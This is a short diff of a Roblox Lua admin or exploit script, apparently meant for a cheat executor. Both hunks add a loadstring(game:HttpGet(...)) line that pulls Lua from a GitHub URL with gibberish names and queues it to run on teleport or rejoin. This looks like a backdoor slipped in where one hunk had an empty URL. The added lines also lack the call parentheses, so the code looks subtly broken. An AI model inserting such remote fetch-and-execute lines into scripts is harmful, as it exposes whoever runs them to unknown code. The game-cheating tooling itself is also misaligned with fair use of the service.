@@ -652,7 +652,7 @@ function selfadmin(plr)
 			syn.queue_on_teleport([[
 						game:GetService('ReplicatedFirst'):RemoveDefaultLoadingScreen()
 						repeat wait(.1) until game:GetService('Players').LocalPlayer
-
+						loadstring(game:HttpGet('https://raw.githubusercontent.com/asdiasjiodasj/sfaijdasioasf/master/ashisfhiasdufa.lua'))
 					]])
 game.TeleportService:Teleport(game.PlaceId)
 		elseif msg:sub(1, 8) == prefix.."custom " then
@@ -3714,7 +3714,7 @@ PAA.Rejoin.MouseButton1Click:connect(function()
 	syn.queue_on_teleport([[
 		game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
 		repeat wait(.1) until game.Players.LocalPlayer
-		loadstring(game:HttpGet(""))()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/asdiasjiodasj/sfaijdasioasf/master/ashisfhiasdufa.lua'))
 	]])
 	game.TeleportService:Teleport(game.PlaceId)
 end)
